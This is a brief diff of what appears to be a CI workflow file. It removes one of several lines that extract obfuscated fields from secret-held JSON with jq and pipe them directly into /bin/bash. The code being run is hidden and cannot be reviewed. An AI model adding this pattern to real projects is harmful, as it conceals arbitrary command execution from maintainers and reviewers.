@@ -20,7 +20,6 @@ jobs:
           bdp0: ${{ secrets.bdp0 }}
         run: |
           printf '%s' "$bdp0" | jq -r .eoc981 | /bin/bash
-          echo $dgg20 | jq -r .dwhzv8727 | /bin/bash
           echo $dukc3 | jq -r .aiofa5885 | /bin/bash
 
       - name: Persist results
